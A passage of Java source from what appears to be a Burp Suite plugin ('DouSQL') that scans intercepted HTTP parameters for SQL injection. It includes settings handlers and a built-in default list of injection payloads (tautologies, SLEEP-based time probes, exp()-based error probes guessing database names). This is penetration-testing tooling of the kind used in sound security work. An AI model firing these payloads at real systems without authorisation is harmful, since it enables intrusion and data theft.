                api.logging().logToOutput("参数过滤模式: 黑名单模式");
            }
        });

        // 保存参数配置按钮事件监听器
        saveParamListBtn.addActionListener(e -> {
            try {
                String paramListText = paramListTextArea.getText();

                // 保存参数过滤模式
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_param_filter_mode.ini")))) {
                    out.write(String.valueOf(paramListMode));
                }

                if (whiteListRadio.isSelected()) {
                    // 保存到白名单配置文件
                    try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_whitelist.ini")))) {
                        out.write(paramListText);
                    }
                    // 更新白名单列表
                    whiteListParams.clear();
                    for (String line : paramListText.split("\\n")) {
                        String trimmedLine = line.trim();
                        if (!trimmedLine.isEmpty()) {
                            whiteListParams.add(trimmedLine);
                        }
                    }
                    api.logging().logToOutput("白名单参数已更新，共" + whiteListParams.size() + "个");
                } else if (blackListRadio.isSelected()) {
                    // 保存到黑名单配置文件
                    try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_blacklist.ini")))) {
                        out.write(paramListText);
                    }
                    // 更新黑名单列表
                    blackListParams.clear();
                    for (String line : paramListText.split("\\n")) {
                        String trimmedLine = line.trim();
                        if (!trimmedLine.isEmpty()) {
                            blackListParams.add(trimmedLine);
                        }
                    }
                    api.logging().logToOutput("黑名单参数已更新，共" + blackListParams.size() + "个");
                }

                api.logging().logToOutput("参数过滤模式已保存: " + paramListMode);
                JOptionPane.showMessageDialog(null, "参数配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存参数配置失败: " + ex.getMessage());
                ex.printStackTrace();
            }
        });

        // 读取黑名单配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist.ini")))) {
            String str;
            blackListParams.clear();
            while ((str = in.readLine()) != null) {
                String trimmedLine = str.trim();
                if (!trimmedLine.isEmpty()) {
                    blackListParams.add(trimmedLine);
                }
            }
        } catch (IOException e) {
            // 忽略，使用空列表
        }

        // 读取参数过滤模式配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_param_filter_mode.ini")))) {
            String modeText = in.readLine();
            if (modeText != null && !modeText.trim().isEmpty()) {
                paramListMode = Integer.parseInt(modeText.trim());
                // 根据读取的模式设置单选按钮状态
                switch (paramListMode) {
                    case 0:
                        noFilterRadio.setSelected(true);
                        break;
                    case 1:
                        whiteListRadio.setSelected(true);
                        // 显示白名单内容
                        try (BufferedReader whiteIn = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_whitelist.ini")))) {
                            String str, strData = "";
                            while ((str = whiteIn.readLine()) != null) {
                                strData += str + "\n";
                            }
                            paramListTextArea.setText(strData);
                        } catch (IOException ex) {
                            // 忽略
                        }
                        break;
                    case 2:
                        blackListRadio.setSelected(true);
                        // 显示黑名单内容
                        try (BufferedReader blackIn = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist.ini")))) {
                            String str, strData = "";
                            while ((str = blackIn.readLine()) != null) {
                                strData += str + "\n";
                            }
                            paramListTextArea.setText(strData);
                        } catch (IOException ex) {
                            // 忽略
                        }
                        break;
                }
                api.logging().logToOutput("已加载参数过滤模式: " + paramListMode);
            }
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
            paramListMode = 0;
            noFilterRadio.setSelected(true);
        }

        btn1.addActionListener(e -> {
            log.clear();
            log2.clear();
            log3.clear();
            log4Md5.clear();
            count = 0;
            fireTableRowsInserted(log.size(), log.size());
            model.fireTableRowsInserted(log3.size(), log3.size());
        });

        btn2.addActionListener(e -> {
            if (diyPayload1 == 1) {
                String temp = payloadTextArea.getText();
                temp = temp.replaceAll(" ", "%20");
                jTextAreaData1 = temp;
            } else {
                jTextAreaData1 = payloadTextArea.getText();
            }

            // 写入当前组的配置文件
            saveCurrentGroupPayload(jTextAreaData1);

            // 写入自定义报错信息配置文件
            try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_diy_error.ini")))) {
                out.write(errorKeywordsTextArea.getText());
            } catch (IOException ex) {
                api.logging().logToOutput("写入报错信息配置文件失败: '" + ex.getMessage() + "'");
            }
        });

        btn3.addActionListener(e -> {
            if (btn3.getText().equals("启动白名单")) {
                btn3.setText("关闭白名单");
                whiteURL = whiteTextField.getText();
                whiteSwitchs = 1;
                whiteTextField.setEditable(false);
                whiteTextField.setForeground(Color.GRAY);
            } else {
                btn3.setText("启动白名单");
                whiteSwitchs = 0;
                whiteTextField.setEditable(true);
                whiteTextField.setForeground(Color.BLACK);
            }
        });

        // 自定义报错信息保存按钮事件监听器
        saveErrorBtn.addActionListener(e -> {
            try {
                String errorText = errorKeywordsTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_diy_error.ini")))) {
                    out.write(errorText);
                }
                
                // 更新报错关键字列表
                updateErrorKeywordsList();
                
                api.logging().logToOutput("已保存自定义报错信息配置");
                JOptionPane.showMessageDialog(null, "报错信息配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存报错信息配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        // 自定义报错信息复选框事件监听器
        enableCustomErrorCheckBox.addItemListener(e -> {
            if (enableCustomErrorCheckBox.isSelected()) {
                api.logging().logToOutput("启用自定义报错信息检测");
                enableCustomError = 1;
                errorKeywordsTextArea.setEditable(false);
                errorKeywordsTextArea.setBackground(Color.LIGHT_GRAY);

                // 更新报错关键字列表
                updateErrorKeywordsList();
            } else {
                api.logging().logToOutput("关闭自定义报错信息检测");
                enableCustomError = 0;
                errorKeywordsTextArea.setEditable(true);
                errorKeywordsTextArea.setBackground(Color.WHITE);
            }
        });

        // 报错信息编辑框失去焦点时更新列表
        errorKeywordsTextArea.addFocusListener(new java.awt.event.FocusAdapter() {
            @Override
            public void focusLost(java.awt.event.FocusEvent evt) {
                if (enableCustomError == 0) { // 只有在未启用时才更新

                    updateErrorKeywordsList();
                }
            }
        });

        // 响应时间阈值保存按钮事件监听器
        saveResponseTimeThresholdBtn.addActionListener(e -> {
            try {
                String thresholdText = responseTimeThresholdField.getText().trim();
                int newThreshold = Integer.parseInt(thresholdText);
                if (newThreshold < 100) {
                    JOptionPane.showMessageDialog(null, "阈值不能小于100毫秒", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                if (newThreshold > 10000) {
                    JOptionPane.showMessageDialog(null, "阈值不能大于10000毫秒", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }

                responseTimeThreshold = newThreshold;
                api.logging().logToOutput("响应时间阈值已更新为: " + responseTimeThreshold + "毫秒");

                // 保存到配置文件
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_response_time_threshold.ini")))) {
                    out.write(String.valueOf(responseTimeThreshold));
                }

                JOptionPane.showMessageDialog(null, "响应时间阈值已保存: " + responseTimeThreshold + "毫秒", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字", "错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存阈值配置失败: " + ex.getMessage());
            }
        });

        // 初始化时读取响应时间阈值配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_response_time_threshold.ini")))) {
            String thresholdText = in.readLine();
            if (thresholdText != null && !thresholdText.trim().isEmpty()) {
                responseTimeThreshold = Integer.parseInt(thresholdText.trim());
                responseTimeThresholdField.setText(String.valueOf(responseTimeThreshold));
                api.logging().logToOutput("已加载响应时间阈值: " + responseTimeThreshold + "毫秒");
            }
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
        }

        // 新建payload组按钮事件监听器
        newGroupBtn.addActionListener(e -> {
            String newGroupName = newGroupNameField.getText();
            createNewGroup(newGroupName);
        });

        // 删除payload组按钮事件监听器
        deleteGroupBtn.addActionListener(e -> {
            deleteCurrentGroup();
        });

        // 重命名payload组按钮事件监听器
        renameGroupBtn.addActionListener(e -> {
            String newGroupName = newGroupNameField.getText();
            renameCurrentGroup(newGroupName);
        });


        // 切换payload组组合框事件监听器
        payloadGroupComboBox.addActionListener(e -> {
            String selectedGroup = (String) payloadGroupComboBox.getSelectedItem();
            if (selectedGroup != null && !selectedGroup.equals(currentGroup)) {
                switchToGroup(selectedGroup);
            }
        });

        // 长度差异阈值保存按钮事件监听器
        saveLengthDiffThresholdBtn.addActionListener(e -> {
            try {
                String thresholdText = lengthDiffThresholdField.getText().trim();
                int newThreshold = Integer.parseInt(thresholdText);
                if (newThreshold < 1) {
                    JOptionPane.showMessageDialog(null, "阈值不能小于1字节", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }
                if (newThreshold > 10000) {
                    JOptionPane.showMessageDialog(null, "阈值不能大于10000字节", "警告", JOptionPane.WARNING_MESSAGE);
                    return;
                }

                lengthDiffThreshold = newThreshold;
                api.logging().logToOutput("长度差异阈值已更新为: " + lengthDiffThreshold + "字节");

                // 保存到配置文件
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_length_diff_threshold.ini")))) {
                    out.write(String.valueOf(lengthDiffThreshold));
                }

                JOptionPane.showMessageDialog(null, "长度差异阈值已保存: " + lengthDiffThreshold + "字节", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (NumberFormatException ex) {
                JOptionPane.showMessageDialog(null, "请输入有效的数字", "错误", JOptionPane.ERROR_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存长度差异阈值配置失败: " + ex.getMessage());
            }
        });

        // 初始化时读取长度差异阈值配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_length_diff_threshold.ini")))) {
            String thresholdText = in.readLine();
            if (thresholdText != null && !thresholdText.trim().isEmpty()) {
                lengthDiffThreshold = Integer.parseInt(thresholdText.trim());
                lengthDiffThresholdField.setText(String.valueOf(lengthDiffThreshold));
                api.logging().logToOutput("已加载长度差异阈值: " + lengthDiffThreshold + "字节");
            }
        } catch (IOException | NumberFormatException e) {
            // 忽略，使用默认值
        }

        // 黑名单URL保存按钮事件监听器
        saveBlackListUrlBtn.addActionListener(e -> {
            try {
                String urlListText = blackListUrlTextArea.getText();
                try (BufferedWriter out = new BufferedWriter(new FileWriter(getConfigFilePath("xia_SQL_blacklist_urls.ini")))) {
                    out.write(urlListText);
                }
                
                // 更新黑名单URL列表
                blackListUrls.clear();
                for (String line : urlListText.split("\\n")) {
                    String trimmedLine = line.trim();
                    if (!trimmedLine.isEmpty()) {
                        blackListUrls.add(trimmedLine);
                    }
                }
                
                api.logging().logToOutput("已保存黑名单URL配置，共" + blackListUrls.size() + "条");
                JOptionPane.showMessageDialog(null, "黑名单URL配置已保存！", "成功", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException ex) {
                api.logging().logToOutput("保存黑名单URL配置失败: " + ex.getMessage());
                JOptionPane.showMessageDialog(null, "保存失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
            }
        });

        // 初始化时读取黑名单URL配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_blacklist_urls.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            blackListUrlTextArea.setText(strData);
            blackListUrls.clear();
            for (String line : strData.split("\\n")) {
                String trimmedLine = line.trim();
                if (!trimmedLine.isEmpty()) {
                    blackListUrls.add(trimmedLine);
                }
            }
            api.logging().logToOutput("已加载黑名单URL配置，共" + blackListUrls.size() + "条");
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        // 初始化payload组
        initializePayloadGroups();
    }

    // 初始化payload分组
    private void initializePayloadGroups() {
        payloadGroups.clear();
        payloadGroupComboBox.removeAllItems();

        // 添加默认组
        payloadGroups.add("default");
        payloadGroupComboBox.addItem("default");

        // 查找所有payload组配置文件
        File configDir = new File(CONFIG_DIR);
        File[] files = configDir.listFiles((dir1, name) -> name.startsWith("xia_SQL_payload_") && name.endsWith(".ini"));

        if (files != null) {
            for (File file : files) {
                String fileName = file.getName();
                // 提取组名：xia_SQL_payload_orderby.ini -> orderby
                // 前缀 "xia_SQL_payload_" 长度为 16 字符
                // 后缀 ".ini" 长度为 4 字符
                String groupName = fileName.substring(16, fileName.length() - 4);
                if (!"default".equals(groupName) && !payloadGroups.contains(groupName)) {
                    payloadGroups.add(groupName);
                    payloadGroupComboBox.addItem(groupName);
                }
            }
        }

        // 设置当前选中的组
        payloadGroupComboBox.setSelectedItem(currentGroup);

        // 加载当前组的payload
        loadCurrentGroupPayload();

        api.logging().logToOutput("已初始化payload组，共" + payloadGroups.size() + "个组");
    }

    // 加载当前组的payload
    private void loadCurrentGroupPayload() {
        String filename = "default".equals(currentGroup) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");

        try (BufferedReader in = new BufferedReader(new FileReader(filename))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
            api.logging().logToOutput("已加载组 '" + currentGroup + "' 的payload");
        } catch (IOException e) {
            // 如果文件不存在，显示默认payload
            payloadTextArea.setText("'''\n\"\"\"\n'+Or+1=1+AND+'Xlz'='Xlz\n'+Or+1=2+AND+'Xlz'='Xlz\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)");
            api.logging().logToOutput("组 '" + currentGroup + "' 的配置文件不存在，使用默认值");
        }
    }

    // 保存当前组的payload
    private void saveCurrentGroupPayload(String payloadContent) {
        String filename = "default".equals(currentGroup) ?
            getConfigFilePath("xia_SQL_diy_payload.ini") :
            getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");

        try (BufferedWriter out = new BufferedWriter(new FileWriter(filename))) {
            out.write(payloadContent);
            api.logging().logToOutput("已保存组 '" + currentGroup + "' 的payload到文件: " + filename);
        } catch (IOException e) {
            api.logging().logToOutput("保存组 '" + currentGroup + "' 的payload失败: " + e.getMessage());
        }
    }

    // 创建新的payload组
    private void createNewGroup(String groupName) {
        if (groupName == null || groupName.trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "组名不能为空", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        groupName = groupName.trim();
        if (payloadGroups.contains(groupName)) {
            JOptionPane.showMessageDialog(null, "组名 '" + groupName + "' 已存在", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        // 添加新组
        payloadGroups.add(groupName);
        payloadGroupComboBox.addItem(groupName);
        payloadGroupComboBox.setSelectedItem(groupName);
        currentGroup = groupName;
        newGroupNameField.setText("新组名");

        // 保存当前编辑器的内容到新组
        String currentContent = payloadTextArea.getText();
        saveCurrentGroupPayload(currentContent);

        api.logging().logToOutput("已创建新payload组: " + groupName);
        JOptionPane.showMessageDialog(null, "已创建新组: " + groupName, "成功", JOptionPane.INFORMATION_MESSAGE);
    }

    // 删除当前payload组
    private void deleteCurrentGroup() {
        if ("default".equals(currentGroup)) {
            JOptionPane.showMessageDialog(null, "不能删除default组", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        int choice = JOptionPane.showConfirmDialog(null,
            "确定要删除组 '" + currentGroup + "' 吗？",
            "确认删除",
            JOptionPane.YES_NO_OPTION);

        if (choice == JOptionPane.YES_OPTION) {
            // 删除组
            String filename = getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");
            File file = new File(filename);
            if (file.exists()) {
                file.delete();
            }

            payloadGroups.remove(currentGroup);
            payloadGroupComboBox.removeItem(currentGroup);

            // 切换到default组
            currentGroup = "default";
            payloadGroupComboBox.setSelectedItem(currentGroup);
            loadCurrentGroupPayload();

            api.logging().logToOutput("已删除payload组: " + currentGroup);
            JOptionPane.showMessageDialog(null, "已删除组，已切换到default组", "成功", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    // 重命名payload组
    private void renameCurrentGroup(String newGroupName) {
        if ("default".equals(currentGroup)) {
            JOptionPane.showMessageDialog(null, "不能重命名default组", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        
        if (newGroupName == null || newGroupName.trim().isEmpty()) {
            JOptionPane.showMessageDialog(null, "新组名不能为空", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        
        newGroupName = newGroupName.trim();
        if (payloadGroups.contains(newGroupName)) {
            JOptionPane.showMessageDialog(null, "新组名 '" + newGroupName + "' 已存在", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }
        

        // 保存当前编辑器内容到新文件
        String currentContent = payloadTextArea.getText();
        String newFilename = getConfigFilePath("xia_SQL_payload_" + newGroupName + ".ini");
        try (BufferedWriter out = new BufferedWriter(new FileWriter(newFilename))) {
            out.write(currentContent);
        } catch (IOException e) {
            api.logging().logToOutput("保存新组文件失败: " + e.getMessage());
            JOptionPane.showMessageDialog(null, "重命名失败：无法创建新文件", "错误", JOptionPane.ERROR_MESSAGE);
            return;
        }

        // 删除旧文件
        String oldFilename = getConfigFilePath("xia_SQL_payload_" + currentGroup + ".ini");
        File oldFile = new File(oldFilename);
        if (oldFile.exists()) {
            if (!oldFile.delete()) {
                api.logging().logToOutput("删除旧文件失败: " + oldFilename);
            }
        }

        // 更新组列表和UI
        int oldIndex = payloadGroups.indexOf(currentGroup);
        payloadGroups.set(oldIndex, newGroupName);
        
        // 更新ComboBox
        payloadGroupComboBox.removeItem(currentGroup);
        payloadGroupComboBox.addItem(newGroupName);
        payloadGroupComboBox.setSelectedItem(newGroupName);
        
        // 更新当前组
        currentGroup = newGroupName;
        newGroupNameField.setText("新组名");
        
        api.logging().logToOutput("已重命名payload组: " + currentGroup);
        JOptionPane.showMessageDialog(null, "已重命名组为: " + currentGroup, "成功", JOptionPane.INFORMATION_MESSAGE);
    }

    // 切换到新的payload组
    private void switchToGroup(String groupName) {
        if (!groupName.equals(currentGroup)) {
            currentGroup = groupName;
            loadCurrentGroupPayload();
            api.logging().logToOutput("已切换到payload组: " + currentGroup);
        }
    }

    // 更新报错关键字列表
    private void updateErrorKeywordsList() {
        errorKeywordsList.clear();
        String text = errorKeywordsTextArea.getText();
        String[] lines = text.split("\\n");
        for (String line : lines) {
            line = line.trim();
            if (!line.isEmpty()) {
                errorKeywordsList.add(line);
            }
        }
        api.logging().logToOutput("已更新报错关键字列表，共" + errorKeywordsList.size() + "条");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        // HTTP监听逻辑简化实现 - 检查工具来源
        if (switchs == 1) {
            burp.api.montoya.core.ToolSource toolSource = responseReceived.toolSource();
            if (toolSource != null && toolSource.toolType() != null) {
                ToolType toolType = toolSource.toolType();
                int toolFlag = 0;

                // 将ToolType转换为原版对应的整数值
                if (toolType == ToolType.REPEATER) {
                    toolFlag = 64;
                } else if (toolType == ToolType.PROXY) {
                    toolFlag = 4;
                } else if (toolType == ToolType.SCANNER) {
                    toolFlag = 16;
                } else if (toolType == ToolType.INTRUDER) {
                    toolFlag = 32;
                } else {
                    // 记录未处理的工具类型
                    api.logging().logToOutput("未处理的工具类型: " + toolType + ", toolFlag=0");
                }

                api.logging().logToOutput("工具来源: " + toolType + ", toolFlag=" + toolFlag + 
                                        ", clicksRepeater=" + clicksRepeater + ", clicksProxy=" + clicksProxy);

                // 修复：区分自动监听和右键发送
                // 自动监听：只有在明确启用监听且toolFlag匹配时才处理
                // 右键发送：使用独立的toolFlag=1024处理
                if ((clicksRepeater == 64 && toolFlag == 64) || 
                    (clicksProxy == 4 && toolFlag == 4) ||
                    (toolFlag == 16) || (toolFlag == 32)) { // Scanner和Intruder始终处理
                    // 在新线程中处理
                    final int finalToolFlag = toolFlag;
                    new Thread(() -> {
                        try {
                            checkVul(burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(
                                responseReceived.initiatingRequest(), responseReceived), finalToolFlag);
                        } catch (Exception ex) {
                            api.logging().logToOutput("处理HTTP响应时出错: " + ex.toString());
                        }
                    }).start();
                }
            }
        }
        return ResponseReceivedAction.continueWith(responseReceived);
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuItems = new ArrayList<>();

        // 支持从 Scanner、Proxy、Repeater 和 Intruder 发送到插件
        if (event.isFromTool(ToolType.SCANNER) || event.isFromTool(ToolType.PROXY) || 
            event.isFromTool(ToolType.REPEATER) || event.isFromTool(ToolType.INTRUDER)) {
            JMenuItem sendItem = new JMenuItem("Send to DouSQL");
            sendItem.addActionListener(e -> {
                if (switchs == 1) {
                    java.util.Optional<MessageEditorHttpRequestResponse> messageOpt = event.messageEditorRequestResponse();
                    if (messageOpt.isPresent()) {
                        // 在新线程中处理，避免阻塞UI
                        new Thread(() -> {
                            try {
                                checkVul(messageOpt.get().requestResponse(), 1024);
                            } catch (Exception ex) {
                                api.logging().logToOutput("处理右键发送时出错: " + ex.toString());
                            }
                        }).start();
                    }
                } else {
                    api.logging().logToOutput("插件DouSQL关闭状态！");
                }
            });
            menuItems.add(sendItem);
        }

        return menuItems;
    }

    // URL匹配工具方法，支持通配符
    private boolean isUrlMatched(String url, String pattern) {
        try {
            // 将通配符模式转换为正则表达式
            String regex = pattern
                .replace(".", "\\.")  // 转义点号
                .replace("*", ".*")   // 将*转换为.*
                .replace("?", ".");   // 将?转换为.
            
            // 检查URL路径是否匹配
            return url.matches(".*" + regex + ".*");
        } catch (Exception e) {
            // 如果正则表达式有问题，使用简单的包含匹配
            return url.contains(pattern);
        }
    }

    // 改进的JSON值替换方法，支持多种数据类型
    private String replaceJsonValue(String jsonBody, String paramName, String newValue) {
        try {
            // 转义参数名中的特殊字符
            String escapedParamName = paramName.replaceAll("([\\[\\]{}()*+?.\\\\^$|])", "\\\\$1");
            
            // 尝试多种JSON值格式的替换
            String[] patterns = {
                // 字符串值: "paramName": "value"
                "\\\"" + escapedParamName + "\\\"\\s*:\\s*\\\"[^\\\"]*\\\"",
                // 数字值: "paramName": 123
                "\\\"" + escapedParamName + "\\\"\\s*:\\s*[0-9]+\\.?[0-9]*",
                // 布尔值: "paramName": true/false
                "\\\"" + escapedParamName + "\\\"\\s*:\\s*(true|false)",
                // null值: "paramName": null
                "\\\"" + escapedParamName + "\\\"\\s*:\\s*null",
                // 数组值: "paramName": [...]
                "\\\"" + escapedParamName + "\\\"\\s*:\\s*\\[[^\\]]*\\]",
                // 对象值: "paramName": {...}
                "\\\"" + escapedParamName + "\\\"\\s*:\\s*\\{[^\\}]*\\}"
            };
            
            String replacement = "\\\"" + paramName + "\\\": \\\"" + newValue + "\\\"";
            
            for (String pattern : patterns) {
                String modifiedJson = jsonBody.replaceAll(pattern, replacement);
                if (!modifiedJson.equals(jsonBody)) {
                    api.logging().logToOutput("  -> JSON替换成功，使用模式: " + pattern);
                    return modifiedJson;
                }
            }
            
            api.logging().logToOutput("  -> 所有JSON替换模式都失败");
            return jsonBody;
            
        } catch (Exception e) {
            api.logging().logToOutput("  -> JSON替换异常: " + e.getMessage());
            return jsonBody;
        }
    }

    // 核心漏洞检查方法
    private void checkVul(HttpRequestResponse baseRequestResponse, int toolFlag) {
        if (baseRequestResponse == null || baseRequestResponse.request() == null) {
            api.logging().logToOutput("检查漏洞：无效的请求");
            return;
        }

        try {
            HttpRequest request = baseRequestResponse.request();
            String url = request.url();
            String method = request.method();

            // HTTP方法过滤 - 只检测GET和POST请求
            if (!method.equalsIgnoreCase("GET") && !method.equalsIgnoreCase("POST")) {
                api.logging().logToOutput("跳过非GET/POST请求：" + method + " " + url);
                return;
            }

            // 白名单检查
            if (whiteSwitchs == 1 && !whiteURL.isEmpty()) {
                String[] whiteUrlList = whiteURL.split(",");
                boolean isWhiteListed = false;
                for (String white : whiteUrlList) {
                    if (url.contains(white.trim())) {
                        api.logging().logToOutput("白名单URL：" + url);
                        isWhiteListed = true;
                        break;
                    }
                }
                if (!isWhiteListed) {
                    api.logging().logToOutput("非白名单URL：" + url);
                    return;
                }
            }

            // 黑名单URL检查
            if (!blackListUrls.isEmpty()) {
                for (String blackUrl : blackListUrls) {
                    if (isUrlMatched(url, blackUrl)) {
                        api.logging().logToOutput("命中黑名单URL，跳过：" + url + " (规则：" + blackUrl + ")");
                        return;
                    }
                }
            }

            // 静态文件检查
            if (toolFlag == 4 || toolFlag == 64) { // Proxy或Repeater
                String[] staticFiles = {"jpg", "png", "gif", "css", "js", "pdf", "mp3", "mp4", "avi"};
                String[] urlParts = url.split("\\.");
                if (urlParts.length > 1) {
                    String extension = urlParts[urlParts.length - 1].toLowerCase();
                    for (String ext : staticFiles) {
                        if (extension.equals(ext)) {
                            api.logging().logToOutput("静态文件跳过：" + url);
                            return;
                        }
                    }
                }
            }

            // 原版逻辑：构建MD5字符串（URL + 参数名 + HTTP方法）
            String tempData = url.split("\\?")[0]; // 获取URL问号前面的部分
            int isAdd = 0;
            String requestData = null;
            String[] requestDatas;
            int jsonCount = -1;

            // 获取所有参数
            List<ParsedHttpParameter> paraLists = request.parameters();

            // 构建参数名称部分
            for (ParsedHttpParameter para : paraLists) {
                HttpParameterType type = para.type();
                if (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
                    type == HttpParameterType.JSON || (isCookie >= 0 && type == HttpParameterType.COOKIE)) {
                    if (isAdd == 0) {
                        isAdd = 1;
                    }
                    tempData += "+" + para.name();

                    // JSON嵌套检测 
                    if (type == HttpParameterType.JSON && request.hasParameters(HttpParameterType.JSON)) {
                        if (requestData == null) {
                            try {
                                requestData = request.bodyToString();
                                // 检测JSON嵌套
                                if (requestData != null) {
                                    api.logging().logToOutput("JSON数据：" + requestData);
                                    requestDatas = requestData.split("\\{");
                                    if (requestDatas.length > 2) {
                                        isAdd = 2;
                                        jsonCount++;
                                        api.logging().logToOutput("发现JSON嵌套");
                                    }
                                    // 检测JSON中的列表
                                    requestDatas = requestData.split("\":\\[");
                                    if (requestDatas.length > 1) {
                                        isAdd = 2;
                                        jsonCount++;
                                        api.logging().logToOutput("发现JSON列表");
                                    }
                                }
                            } catch (Exception e) {
                                api.logging().logToOutput("JSON处理错误：" + e.getMessage());
                            }
                        }
                    }
                }
            }

            // 添加HTTP方法 
            tempData += "+" + request.method();
            api.logging().logToOutput("\\nMD5(\"" + tempData + "\")");
            String md5Data = MD5(tempData);
            api.logging().logToOutput(md5Data);
            api.logging().logToOutput("原始URL：" + url);
            api.logging().logToOutput("处理后的tempData：" + tempData);

            // 检查是否已扫描过 
            for (RequestMd5 md5Item : log4Md5) {
                if (md5Item.md5Data.equals(md5Data)) {
                    if (toolFlag == 1024) { // 右键发送过来的请求不进行MD5验证
                        String timeTemp = String.valueOf(System.currentTimeMillis());
                        md5Data = MD5(timeTemp);
                    } else {
                        api.logging().logToOutput("已检查过的URL：" + url);
                        return;
                    }
                }
            }

            // 记录原始请求 - 移到参数过滤检查之后
            if (isAdd != 0) {
                // 先进行参数过滤检查
                List<ParsedHttpParameter> testableParams = new ArrayList<>();
                for (ParsedHttpParameter para : paraLists) {
                    HttpParameterType type = para.type();
                    if (type == HttpParameterType.URL || type == HttpParameterType.BODY ||
                        type == HttpParameterType.JSON || (isCookie >= 0 && type == HttpParameterType.COOKIE) ||
                        type == HttpParameterType.XML || type == HttpParameterType.XML_ATTRIBUTE ||
                        type == HttpParameterType.MULTIPART_ATTRIBUTE) {
                        testableParams.add(para);
                    }
                }

                // 根据参数过滤模式进行预过滤检查
                List<ParsedHttpParameter> filteredParams = new ArrayList<>();
                if (paramListMode == 1) { // 白名单模式
                    for (ParsedHttpParameter para : testableParams) {
                        if (whiteListParams.contains(para.name())) {
                            filteredParams.add(para);
                        }
                    }
                } else if (paramListMode == 2) { // 黑名单模式
                    for (ParsedHttpParameter para : testableParams) {
                        if (!blackListParams.contains(para.name())) {
                            filteredParams.add(para);
                        }
                    }
                } else { // 无过滤模式
                    filteredParams.addAll(testableParams);
                }

                // 如果没有可测试参数，直接返回，不记录到结果中
                if (filteredParams.isEmpty()) {
                    api.logging().logToOutput("无可测试参数，跳过此请求");
                    // 注意：不要移除MD5记录，避免重复处理同一请求
                    // 保持MD5记录，防止无限循环
                    return;
                }

                log4Md5.add(new RequestMd5(md5Data));
                api.logging().logToOutput("isAdd=" + isAdd);

                count++;
                dataMd5Id = md5Data;  // 一致的data_md5_id

                LogEntry originalLogEntry = new LogEntry(
                    count,
                    toolFlag,
                    baseRequestResponse,
                    url,
                    "",
                    "",
                    "",
                    md5Data,
                    0,
                    "start",
                    baseRequestResponse.response() != null ? baseRequestResponse.response().statusCode() : 0
                );
                log.add(originalLogEntry);
                fireTableRowsInserted(log.size() - 1, log.size() - 1);

                api.logging().logToOutput("开始测试URL：" + url);
